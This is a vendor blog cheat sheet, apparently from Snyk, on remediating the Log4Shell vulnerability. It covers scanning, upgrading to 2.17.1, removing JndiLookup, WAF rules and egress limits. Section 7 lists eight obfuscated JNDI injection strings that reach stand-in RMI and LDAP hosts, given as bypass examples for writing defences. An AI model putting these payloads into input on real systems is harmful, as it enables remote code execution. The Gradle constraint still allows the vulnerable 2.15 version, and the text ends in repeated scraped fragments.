@@ -1,0 +1,103 @@
+
+Editor's note (28 Dec 2021 at 7:35 p.m. GMT): The Log4j team released a new security update that found 2.17.0 to be vulnerable to remote code execution, identified by CVE-2021-44832. We recommend upgrading to the latest version, which at this time is 2.17.1. The Log4j situation is rapidly changing and we are updating our blogs as new information becomes available.
+By now, we’ve all heard about the Log4Shell vulnerability. This Log4Shell remediation cheat sheet summarizes the main fixes and recommendations being used to limit exposure to the vulnerability and to reduce the risk of this vulnerability being exploited in production systems. Note that this is a living document and is being updated as new information becomes available. Please share this around the community so folks are aware of how they can actively mitigate this issue right now.
+In this post, we'll explore these remediation recommendations:
+
+Gain visibility by identifying where your applications uses Log4j
+Upgrade to Log4j 2.17.1 or higher
+Remove the Log4j lookup capability
+Disable lookups via properties
+Upgrading your JDK isn’t enough
+Monitor projects using auto-PR support
+Add WAF rules to block malicious inbound requests
+Restrict egress back to the internet
+Download the Log4Shell Remediation Cheat Sheet
+1. Gain visibility by identifying where your application uses Log4j
+One of the biggest challenges faced right now is understanding where in our production environments Log4j is being introduced. It can be brought into our applications directly, or transitively, through the dependencies we use. So step 1 is to identify where and if you’re using Log4j. Note that there’s a very good chance you are without realizing it.
+You can use Snyk to run a full scan across all your projects in your Git repositories, providing you with a report of all the direct and transitive dependencies you are using.  From this report, you’ll see if you’re pulling in Log4j, and how many paths in your dependency graph it’s being used in. Note that this is all available on the self-serve, free tier of Snyk, so you can get started right away.
+Update: Snyk CLI has a new command designed to do one thing: find traces of the Log4j library affected by the Log4Shell vulnerability. snyk log4shell tests your built Java project and finds traces of the vulnerable library even if it is not declared in the manifest files. Learn about snyk log4shell and how to use it in your projects.
+Alternatively, a more manual approach would be to run mvn dependency:tree | grep log4j on your maven projects to identify where Log4j is being used in your dependency tree for each project.
+2. Upgrade to Log4j 2.17.1 or higher
+Important note: Upgrading to 2.17.1 will fix CVE-2021-44228, CVE-2021-45046, CVE-2021-45105, CVE-2021-44832.
+The Log4j team added multiple vulnerability fixes into version 2.17.1 of Log4j. They also disabled JNDI functionality by default starting in 2.16. Where possible, you should upgrade to version 2.17.1 or higher immediately. However that’s often easier said than done. If you’re pulling Log4j into your projects as a direct dependency, this could be a fairly simple update. If it’s being added as a transitive dependency, for instance you use a dependency that uses Log4j, you'll need to upgrade the dependency to a version that uses Log4j at version 2.17.1. Now, since this is a very new vulnerability, it will take our ecosystem a while for other dependencies to upgrade and include this fixed version of Log4j, and in the meantime, we need to mitigate this risk in other ways.
+Note: If you tested with Snyk in step 1, you will have the option to automatically upgrade, where possible, by clicking Open a PR, which will move you up to the closest fixed version of Log4j (at the time of writing 2.17.1), or other direct dependencies that use Log4j.
+If you’re using Gradle, you can prevent accidental resolution of a vulnerable Log4j version in your project by using the dependency constraints feature to make sure that your project cannot resolve an impacted Log4j version by adding the following snippet to your Gradle build (check out this Gradle blog for more information):
+1dependencies {
+2    constraints {
+3        implementation("org.apache.logging.log4j:log4j-core") {
+4            version {
+5                strictly("[2.15, 3[")
+6                prefer("2.15.0")
+7            }
+8            because("CVE-2021-44228: Log4j vulnerable to remote code execution")
+9        }
+10    }
+11}
+3. Remove the Log4j lookup capability
+If you can’t upgrade — or if you want to take risk mitigation further — the next step is to remove Log4j's ability to perform these lookups. This functionality is in the JndiLookup.class in your runtime environments. Note, that removing this on running environments is not enough by itself, you will also need to restart your JVM environment. If you’re using a Tomcat server, for example, you’ll need to stop and start the server. An example command to remove the class file from your JAR is as follows:
+1zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
+It is also a good idea to remove other classes at the same time which could also be used in this or similar attacks. These files include JndiManager, JMSAppender, and SMTPAppender. Be warned that removing classes from a runtime environment may cause unexpected behavior.
+4. Disable lookups via properties
+Another way to disable lookups programmatically for Log4j versions greater or equal to 2.10 is to set the system property LOG4J_FORMAT_MSG_NO_LOOKUPS to true or by setting an environment variable: Dlog4j2.formatMsgNoLookups=true. These are variables which Log4j uses to determine if it should perform lookups or not.
+Similar to the removal of Log4j files, these changes will require a JVM restart, which might mean stopping and restarting your Tomcat server (for example) so that the new properties can be used.
+Note that it has been discovered that this approach is a partial fix only.
+5. Upgrading your JDK isn't enough
+While initial advice suggested a JDK upgrade could mitigate the vulnerability, it was later shown not to be effective against this vulnerability. This includes setting com.sun.jndi.ldap.object.trustURLCodebase to false.
+6. Monitor projects using auto-PR support
+Since this is a zero-day vulnerability that is changing daily, it’s important to make sure that we’re as protected as we can be going forward. If using Snyk, be sure to keep your projects monitored (enabled by default when importing a repo into the Snyk app). This means Snyk will automatically test projects daily, in addition to the other tests carried out when you make updates.
+These daily tests will automatically identify when security improvements can be made, including where new fixes can be applied. For example, if you’re using Log4j as a transitive dependency of package A, you need package A to release a version which uses Log4j at version 2.17.1. This might not be available today, but it might be released tomorrow, or next week. Using snyk monitor will test daily for you and send you a PR when the new upgrade becomes available which will upgrade the version of Log4j to remediate the vulnerability.
+It’s also important to note that Snyk will alert you, via PRs or other mechanisms, if further fixes are made under this vulnerability or if future attack vectors are found that surface new vulns. This helps make sure that you’re the first to know what you need to do if further issues arise.
+7. Add WAF rules to block malicious inbound requests
+Up to now, we’ve very much focused on the application part of the remediation process. However additional steps can be taken to help mitigate the risk outside of the application. WAF rules can be added to filter inbound requests.
+Note that this isn’t an approach that should be relied upon, since attackers are creating new attack strings every hour that can circumvent these rules. You might need to add these manually, but some WAF providers, such as CloudFlare, have already released new rules to deny requests that look like malicious attacks against this vulnerability. Here are some examples of attack attempts that have been seen to bypass rules:
+1${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
+2${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
+3${jndi:rmi://adsasd.asdasd.asdasd}
+4${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
+5${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
+6${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
+7${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
+8${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://%s}
+8. Restrict egress back to the internet
+The WAF rules will restrict requests coming into your application, but an equal concern is with requests leaving your application to make these malicious LDAP requests to a compromised naming service. A solution here is to update your egress policies, perhaps through your Kubernetes configuration or other mechanisms in your environment to restrict outbound requests that look like they’re performing malicious naming lookups from Log4j.
+Similar to WAF, this is not a flawless fix, as it is still possible to construct malicious payloads even without an external LDAP network request (for example, the case described earlier with Tomcat servers) via vulnerable gadgets.
+What is this new zero-day Log4j vulnerability?
+The new vulnerability was found in the open source Java library `log4j-core` which is a component of one of the most popular Java logging frameworks categorized as Critical with a CVSS score of 10 (the highest score possible). When using a vulnerable version of Log4j, any incoming data that gets logged can lead to a remote code execution.
+How bad is the Log4Shell vulnerability?
+The simple answer is “very bad”! It’s a critical security vulnerability with a CVSS score of 10 (the highest score possible) that allows attackers to execute code remotely in vulnerable environments. This is a big deal and requires urgent action to fix.
+When was this Log4j vulnerability found?
+The new Log4j zero-day vulnerability was disclosed on Friday December 10th, 2021.
+Who discovered the Log4j Vulnerability?
+The vulnerability was discovered by Chen Zhaojun from Alibaba’s Cloud Security team.
+Gain visibility by identifying where your applications uses Log4j
+Upgrade to Log4j 2.17.1 or higher
+2.17.1
+Remove the Log4j lookup capability
+Disable lookups via properties
+Upgrading your JDK isn’t enough
+Monitor projects using auto-PR support
+Add WAF rules to block malicious inbound requests
+Restrict egress back to the internet
+snyk log4shell
+snyk log4shell
+mvn dependency:tree | grep log4j
+2.17.1
+2.17.1
+2.16
+2.17.1
+2.17.1
+2.17.1
+JndiLookup.class
+JndiManager
+JMSAppender
+SMTPAppender
+2.10
+LOG4J_FORMAT_MSG_NO_LOOKUPS
+true
+Dlog4j2.formatMsgNoLookups=true
+com.sun.jndi.ldap.object.trustURLCodebase
+false
+package A
+package A
+2.17.1
+snyk monitor
